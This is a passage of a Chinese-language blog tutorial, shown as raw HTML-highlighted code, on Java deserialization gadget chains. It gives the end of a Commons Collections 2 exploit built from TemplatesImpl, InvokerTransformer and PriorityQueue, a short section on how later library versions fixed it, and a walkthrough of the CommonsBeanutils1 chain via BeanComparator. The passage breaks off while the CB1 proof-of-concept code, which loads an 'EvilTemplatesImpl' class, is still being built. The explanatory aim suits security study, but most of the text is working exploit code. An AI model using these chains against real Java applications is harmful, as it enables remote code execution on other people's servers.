&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>&lt;span style="color:#111">getBytescode&lt;/span>&lt;span style="color:#f92672">()});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;toString&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Comparator&lt;/span> &lt;span style="color:#111">comparator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformingComparator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">PriorityQueue&lt;/span> &lt;span style="color:#111">queue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iMethodName&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;newTransformer&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="修复">修复&lt;/h3>
&lt;p>这条CC2是cc4限定，因为&lt;code>org.apache.commons.collections4.comparators.TransformingComparator&lt;/code>在之前版本是没有&lt;code>Serializable&lt;/code>接口的，无法在序列化中使用&lt;/p>
&lt;p>在cc3.2.2版中通过添加&lt;code>FunctorUtils#checkUnsafeSerialization&lt;/code>来检测反序列化是否安全，如果没有设置&lt;code>org.apache.commons.collections.enableUnsafeSerialization=true&lt;/code>，会抛出异常&lt;/p>
&lt;p>这个检查在常见的危险Transformer类（Instantiate, Invoker, Prototype, CloneTransformer）里的readObject调用&lt;/p>
&lt;p>在cc4.1版中，这几个类没有Serializable接口，彻底无法序列化了&lt;/p>
&lt;h2 id="cb1">CB1&lt;/h2>
&lt;p>Commons Beanutils，顾名思义封装了对java bean的一些操作方法，比如可以直接调用java bean的getter方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">PropertyUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Cat&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里会自动找到name属性的方法，即getName，除此之外这个方法还支持递归获取属性&lt;/p>
&lt;p>在上面的CC2中我们使用了PriorityQueue，在它的排序中涉及到Comparator接口的compare方法，最后触发transform，在CB中也存在一个可利用的Comparator对象，BeanComparator&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">compare&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">T&lt;/span> &lt;span style="color:#111">o1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">T&lt;/span> &lt;span style="color:#111">o2&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">property&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">internalCompare&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">o2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">PropertyUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">property&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">PropertyUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">property&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">internalCompare&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IllegalAccessException&lt;/span> &lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;IllegalAccessException: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationTargetException&lt;/span> &lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;InvocationTargetException: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NoSuchMethodException&lt;/span> &lt;span style="color:#111">var7&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;NoSuchMethodException: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">var7&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>传入两个对象，如果property为空则直接比较对象，否则用getProperty取出属性比较，调用对象的getter&lt;/p>
&lt;p>回想当时TemplatesImpl的调用链&lt;/p>
&lt;pre tabindex="0">&lt;code>TemplateImpl#getOutputProperties public
-&amp;gt; TemplateImpl#newTransformer public
-&amp;gt; TemplateImpl#getTransletInstance
-&amp;gt; TemplateImpl#defineTransletClasses
-&amp;gt; TemplateImpl#defineClass default
&lt;/code>&lt;/pre>&lt;p>注意到&lt;code>getOutputProperties&lt;/code>，是触发后面的关键&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">synchronized&lt;/span> &lt;span style="color:#111">Properties&lt;/span> &lt;span style="color:#75af00">getOutputProperties&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">newTransformer&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getOutputProperties&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">TransformerConfigurationException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>它就是一个getter！跟前面的结合起来&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">PropertyUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;outputProperties&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>当o1为TemplatesImpl对象时，就会调用getOutputProperties&lt;/p>
&lt;p>构造链子&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.PriorityQueue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.ClassPool&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.beanutils.BeanComparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommonsBeanutils1&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ClassPool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">evil&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">EvilTemplatesImpl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#75af00">toBytecode&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
